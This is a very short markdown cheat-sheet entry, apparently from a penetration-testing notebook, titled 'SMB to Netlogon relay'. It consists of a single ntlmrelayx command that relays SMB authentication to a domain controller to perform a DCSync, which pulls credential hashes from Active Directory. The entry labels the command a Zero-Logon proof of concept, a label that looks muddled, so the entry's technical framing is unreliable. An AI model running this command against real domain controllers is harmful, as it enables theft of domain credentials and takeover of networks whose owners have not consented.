# SMB to Netlogon relay

## Tools: Zero-Logon , impacket-ntlmrelayx

## Commands:

 - Zero-Logon PoC

       ntlmrelayx -t dcsync://DC02_IP -smb2support -auth-smb USER:PASSWORD (DC Sync)
